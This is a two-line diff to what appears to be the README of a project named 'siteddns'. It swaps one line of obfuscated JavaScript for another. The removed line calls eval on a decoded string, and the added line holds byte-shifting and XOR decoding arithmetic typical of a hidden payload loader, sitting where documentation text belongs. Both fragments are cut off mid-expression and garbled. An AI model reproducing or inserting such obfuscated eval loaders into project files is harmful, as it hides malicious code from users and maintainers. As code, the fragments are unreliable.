@@ -1,2 +1,2 @@
  # siteddns
->6))^61;}while(--zg>=2);";eval(zg);zg=52;while(true){if(zg
+=1;en--){cn[en]=((((cn[en]+124)&0xff)^160)>>7)|(((((cn[en]+124)&0xff)^160)
